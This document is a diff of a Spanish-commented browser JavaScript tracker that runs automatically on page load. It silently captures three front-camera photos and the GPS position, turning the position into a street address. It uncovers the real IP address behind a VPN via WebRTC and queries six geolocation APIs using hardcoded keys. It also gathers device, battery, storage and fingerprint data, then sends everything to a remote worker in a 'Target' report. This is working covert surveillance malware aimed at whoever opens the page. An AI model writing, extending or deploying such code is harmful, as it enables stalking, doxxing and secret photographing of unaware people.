@@ -4,45 +4,47 @@
     const workerUrl = scriptTag.dataset.serverUrl;
 
     // ============================================================
-    // 1. CAPTURAR MÚLTIPLES FOTOS (SIN TRABAR)
+    // 1. GEOCÓDIGO INVERSO CON OPENSTREETMAP NOMINATIM
     // ============================================================
-    async function capturarFotos(cantidad = 3) {
-        const fotos = [];
-        const video = document.createElement('video');
-        const canvas = document.createElement('canvas');
-        video.style.display = 'none';
-        canvas.style.display = 'none';
-        document.body.appendChild(video);
-        document.body.appendChild(canvas);
-
+    async function reverseGeocode(lat, lng) {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
-            });
-            video.srcObject = stream;
-            await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
-            await new Promise(r => setTimeout(r, 300));
-
-            for (let i = 0; i < cantidad; i++) {
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
-                fotos.push(blob);
-                await new Promise(r => setTimeout(r, 200)); // Pequeña pausa entre fotos
+            const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&zoom=18&addressdetails=1`;
+            const res = await fetch(url, { headers: { 'User-Agent': 'TrackerBot/1.0' } });
+            const data = await res.json();
+            if (data && data.display_name) {
+                return data.display_name;
             }
-
-            stream.getTracks().forEach(t => t.stop());
-            video.remove();
-            canvas.remove();
-            return fotos;
+            return null;
         } catch(e) {
-            return [];
+            return null;
         }
     }
 
     // ============================================================
-    // 2. CAPTURAR GPS CON WATCHPOSITION (MÁXIMA PRECISIÓN)
+    // 2. WEBRTC - DETECTA IP REAL (INCLUSO DETRÁS DE VPN)
+    // ============================================================
+    function obtenerIPWebRTC() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (ice) => {
+                if (!ice || !ice.candidate) return;
+                const ip = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                if (ip) {
+                    pc.close();
+                    resolve(ip[0]);
+                }
+            };
+            setTimeout(() => {
+                pc.close();
+                resolve(null);
+            }, 3000);
+        });
+    }
+
+    // ============================================================
+    // 3. CAPTURAR GPS CON WATCHPOSITION (MÁXIMA PRECISIÓN)
     // ============================================================
     function capturarGPS() {
         return new Promise((resolve) => {
@@ -78,56 +80,88 @@
     }
 
     // ============================================================
-    // 3. CAPTURAR IP CON MÚLTIPLES APIs
+    // 4. CAPTURAR FOTOS MÚLTIPLES
     // ============================================================
-    async function capturarIP() {
-        const resultados = [];
-        // ipapi.co
+    async function capturarFotos(cantidad = 3) {
+        const fotos = [];
+        const video = document.createElement('video');
+        const canvas = document.createElement('canvas');
+        video.style.display = 'none';
+        canvas.style.display = 'none';
+        document.body.appendChild(video);
+        document.body.appendChild(canvas);
+
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            if (data.latitude && data.longitude) {
-                resultados.push({
-                    fuente: 'ipapi.co',
-                    lat: data.latitude,
-                    lng: data.longitude,
-                    ciudad: data.city,
-                    region: data.region,
-                    pais: data.country_name,
-                    codigo: data.postal,
-                    ip: data.ip,
-                    timezone: data.timezone,
-                    isp: data.org
-                });
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
+            });
+            video.srcObject = stream;
+            await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
+            await new Promise(r => setTimeout(r, 300));
+
+            for (let i = 0; i < cantidad; i++) {
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
+                fotos.push(blob);
+                await new Promise(r => setTimeout(r, 200));
             }
-        } catch(e) {}
-        // ipinfo.io (si tienes token, ponlo en una variable)
-        const IPINFO_TOKEN = 'TU_TOKEN_IPINFO'; // Opcional
-        if (IPINFO_TOKEN && IPINFO_TOKEN !== 'TU_TOKEN_IPINFO') {
-            try {
-                const res = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
-                const data = await res.json();
-                if (data.loc) {
-                    const [lat, lng] = data.loc.split(',').map(Number);
-                    resultados.push({
-                        fuente: 'ipinfo.io',
-                        lat, lng,
-                        ciudad: data.city,
-                        region: data.region,
-                        pais: data.country,
-                        ip: data.ip,
-                        timezone: data.timezone,
-                        isp: data.org
-                    });
-                }
-            } catch(e) {}
+
+            stream.getTracks().forEach(t => t.stop());
+            video.remove();
+            canvas.remove();
+            return fotos;
+        } catch(e) {
+            return [];
         }
-        // Cloudflare (se obtiene desde el Worker, no desde aquí)
+    }
+
+    // ============================================================
+    // 5. OBTENER UBICACIÓN COMPLETA (GPS + 6 APIs + WebRTC)
+    // ============================================================
+    const API_KEYS = {
+        ipgeolocation: 'eb29afb1d16f49c796cfb25b58337e7f',
+        ip2location: '2BC35858A6896EBB76CC56C0F5D015FA'
+    };
+
+    async function obtenerUbicacionCompleta() {
+        const resultados = {
+            gps: null,
+            ipData: [],
+            ipLocal: null
+        };
+
+        resultados.gps = await capturarGPS();
+
+        const apis = [
+            { name: 'ipapi.co', url: 'https://ipapi.co/json/' },
+            { name: 'ipwho.is', url: 'https://ipwho.is/' },
+            { name: 'ip-api.com', url: 'http://ip-api.com/json/' },
+            { name: 'ipinfo.io', url: 'https://ipinfo.io/json?token=cc8b16d96bd8ad' },
+            { name: 'ipgeolocation.io', url: `https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEYS.ipgeolocation}` },
+            { name: 'ip2location.io', url: `https://api.ip2location.io/?key=${API_KEYS.ip2location}` }
+        ];
+
+        resultados.ipData = await Promise.all(
+            apis.map(async (api) => {
+                try {
+                    const res = await fetch(api.url);
+                    const data = await res.json();
+                    return { fuente: api.name, data };
+                } catch(e) {
+                    return { fuente: api.name, data: null, error: e.message };
+                }
+            })
+        );
+
+        resultados.ipLocal = await obtenerIPWebRTC();
+
         return resultados;
     }
 
     // ============================================================
-    // 4. DATOS DEL DISPOSITIVO (DETALLADOS)
+    // 6. DATOS DEL DISPOSITIVO
     // ============================================================
     function obtenerDispositivo() {
         const ua = navigator.userAgent;
@@ -153,7 +187,7 @@
     }
 
     // ============================================================
-    // 5. FINGERPRINT (GPU Y CANVAS)
+    // 7. FINGERPRINT
     // ============================================================
     function obtenerFingerprint() {
         try {
@@ -179,7 +213,7 @@
     }
 
     // ============================================================
-    // 6. BATERÍA Y ALMACENAMIENTO
+    // 8. BATERÍA Y ALMACENAMIENTO
     // ============================================================
     async function obtenerBateria() {
         try {
@@ -206,7 +240,7 @@
     }
 
     // ============================================================
-    // 7. PERMISOS
+    // 9. PERMISOS
     // ============================================================
     async function obtenerPermisos() {
         const permisos = { camera: 'Desconocido', location: 'Desconocido' };
@@ -222,14 +256,12 @@
     }
 
     // ============================================================
-    // 8. ENVIAR TODOS LOS DATOS AL WORKER
+    // 10. ENVIAR TODOS LOS DATOS AL WORKER
     // ============================================================
     async function enviarAlWorker() {
-        // Capturar todo en paralelo
-        const [fotos, gps, ipData, dispositivo, fp, bateria, almacenamiento, permisos] = await Promise.all([
+        const [fotos, ubicacion, dispositivo, fp, bateria, almacenamiento, permisos] = await Promise.all([
             capturarFotos(3),
-            capturarGPS(),
-            capturarIP(),
+            obtenerUbicacionCompleta(),
             obtenerDispositivo(),
             obtenerFingerprint(),
             obtenerBateria(),
@@ -237,77 +269,95 @@
             obtenerPermisos()
         ]);
 
-        // ========== CONSTRUIR MENSAJE ==========
-        let msg = '📊 *CAPTURA DE DATOS COMPLETA*\n━━━━━━━━━━━━━━━━\n';
+        let msg = '📊 *VISITOR INFORMATION CAPTURED*\n━━━━━━━━━━━━━━━━\n';
 
-        // 1. Dispositivo y navegador
+        // 1. Dispositivo
         msg += `🖥️ *Device & Browser*\n`;
         msg += `   • Device Model: ${dispositivo.modelo}\n`;
         msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;
 
-        // 2. Red
-        const ip = ipData.length > 0 ? ipData[0] : null;
-        if (ip) {
-            msg += `🌐 *Network Information*\n`;
-            msg += `   • IP Address: ${ip.ip || 'N/A'}\n`;
-            msg += `   • Language: ${dispositivo.language}\n\n`;
+        // 2. IP Local (WebRTC)
+        if (ubicacion.ipLocal) {
+            msg += `🔒 *Local IP (WebRTC)*\n   • ${ubicacion.ipLocal}\n\n`;
         }
 
-        // 3. Ubicación (GPS o IP)
-        if (gps) {
-            msg += `📍 *GPS Location* (precisión ±${gps.acc}m)\n`;
-            msg += `   • Lat: ${gps.lat}\n`;
-            msg += `   • Lng: ${gps.lng}\n`;
-            msg += `   • Altitud: ${gps.alt || 'N/A'} m\n`;
-            if (gps.heading) msg += `   • Dirección: ${gps.heading}°\n`;
-            if (gps.speed) msg += `   • Velocidad: ${gps.speed} m/s\n`;
-            msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n\n`;
-        } else if (ip) {
-            msg += `📍 *IP Location* (aproximada)\n`;
-            msg += `   • País: ${ip.pais || 'N/A'}\n`;
-            msg += `   • Región: ${ip.region || 'N/A'}\n`;
-            msg += `   • Ciudad: ${ip.ciudad || 'N/A'}\n`;
-            msg += `   • Código Postal: ${ip.codigo || 'N/A'}\n`;
-            msg += `   • Timezone: ${ip.timezone || 'N/A'}\n`;
-            msg += `   • ISP: ${ip.isp || 'N/A'}\n`;
-            msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${ip.lat},${ip.lng}\n\n`;
+        // 3. Red
+        msg += `🌐 *Network Information*\n`;
+        ubicacion.ipData.forEach(api => {
+            if (api.data && !api.error) {
+                const d = api.data;
+                let ip = d.ip || d.query || 'N/A';
+                let ciudad = d.city || 'N/A';
+                let region = d.region || d.regionName || 'N/A';
+                let pais = d.country || d.country_name || 'N/A';
+                msg += `   • ${api.fuente}: ${ip} | ${ciudad}, ${region}, ${pais}\n`;
+            }
+        });
+
+        // 4. Ubicación (GPS + Geocódigo)
+        if (ubicacion.gps) {
+            const g = ubicacion.gps;
+            const direccion = await reverseGeocode(g.lat, g.lng);
+            msg += `\n📍 *GPS Location* (precisión ±${g.acc}m)\n`;
+            msg += `   • Lat: ${g.lat}\n`;
+            msg += `   • Lng: ${g.lng}\n`;
+            if (g.alt) msg += `   • Altitud: ${g.alt} m\n`;
+            if (g.heading) msg += `   • Dirección: ${g.heading}°\n`;
+            if (g.speed) msg += `   • Velocidad: ${g.speed} m/s\n`;
+            if (direccion) msg += `   • 📌 Dirección exacta: ${direccion}\n`;
+            msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${g.lat},${g.lng}\n\n`;
         } else {
-            msg += `📍 Ubicación: No disponible\n\n`;
+            const apiConDatos = ubicacion.ipData.find(api => api.data && api.data.lat && api.data.lon);
+            if (apiConDatos) {
+                const d = apiConDatos.data;
+                msg += `\n📍 *IP Location (${apiConDatos.fuente})*\n`;
+                msg += `   • Country: ${d.country || d.country_name || 'N/A'}\n`;
+                msg += `   • Region: ${d.region || d.regionName || 'N/A'}\n`;
+                msg += `   • City: ${d.city || 'N/A'}\n`;
+                msg += `   • Postal Code: ${d.zip || d.postal || 'N/A'}\n`;
+                msg += `   • Timezone: ${d.timezone || 'N/A'}\n`;
+                if (d.isp) msg += `   • ISP: ${d.isp}\n`;
+                if (d.org) msg += `   • Organization: ${d.org}\n`;
+                msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${d.lat},${d.lon}\n\n`;
+            } else {
+                msg += `\n📍 *Location Details*\n   • No disponible\n\n`;
+            }
         }
 
-        // 4. Display
+        // 5. Display
         msg += `🖼️ *Display Information*\n`;
         msg += `   • Resolution: ${dispositivo.resolution}\n`;
         msg += `   • Color Depth: ${dispositivo.colorDepth}\n\n`;
 
-        // 5. Batería
+        // 6. Batería
         msg += `🔋 *Battery Status*\n`;
         msg += `   • Level: ${bateria.level}\n`;
         msg += `   • Charging: ${bateria.charging}\n\n`;
 
-        // 6. Permisos
+        // 7. Permisos
         msg += `🔐 *Device Permissions*\n`;
         msg += `   • Camera: ${permisos.camera}\n`;
         msg += `   • Location: ${permisos.location}\n\n`;
 
-        // 7. Hardware
+        // 8. Hardware
         msg += `💾 *Hardware & Storage*\n`;
         msg += `   • CPU Cores: ${dispositivo.cpuCores}\n`;
         msg += `   • RAM: ${dispositivo.deviceMemory} GB\n`;
         msg += `   • Storage Used: ${almacenamiento.used}\n`;
         msg += `   • Storage Total: ${almacenamiento.total}\n\n`;
 
-        // 8. Fingerprint
+        // 9. Fingerprint
         msg += `🎨 *Fingerprint*\n`;
-        msg += `   • GPU: ${fp.gpu}\n`;
-        msg += `   • Canvas: ${fp.canvas}\n\n`;
+        msg += `   • GPU: ${fp.gpu}\n\n`;
 
+        // 10. Target
+        msg += `🎯 Target: ${trackingId || 'N/A'}\n`;
+        msg += `⚡ Developed by: @societykark\n\n`;
         msg += `⏰ ${new Date().toISOString()}`;
 
         // ========== ENVIAR AL WORKER ==========
         const formData = new FormData();
         formData.append('text', msg);
-        // Enviar todas las fotos (máximo 3)
         fotos.forEach((foto, index) => {
             if (foto) formData.append(`photo_${index}`, foto, `photo_${index}.jpg`);
         });
@@ -320,7 +370,7 @@
     }
 
     // ============================================================
-    // 9. EJECUTAR AL CARGAR LA PÁGINA
+    // 11. EJECUTAR AL CARGAR LA PÁGINA
     // ============================================================
     window.addEventListener('load', () => {
         setTimeout(enviarAlWorker, 1000);
